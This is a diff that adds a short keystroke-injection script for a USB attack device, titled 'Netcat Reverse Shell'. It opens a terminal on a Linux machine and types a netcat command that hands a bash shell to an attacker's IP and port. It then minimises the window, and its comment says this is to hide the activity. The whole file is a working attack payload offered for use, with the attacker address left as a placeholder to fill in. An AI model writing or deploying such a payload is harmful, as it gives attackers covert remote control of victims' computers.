@@ -1,0 +1,16 @@
+META linux acceso
+REM Title: Netcat Reverse Shell
+REM Author: UndedInside
+REM Description: Opens a reverse shell to the attacker's IP
+REM Edit the IP and port on the STRINGLN line before using
+
+REM Open terminal window
+DEFAULTDELAY 400
+ALT t
+DELAY 1000
+
+REM Replace 0.0.0.0 with attacker IP before using
+STRINGLN nc 0.0.0.0 1234 -e /bin/bash
+
+REM Minimise window to run stealthily
+ALT F9
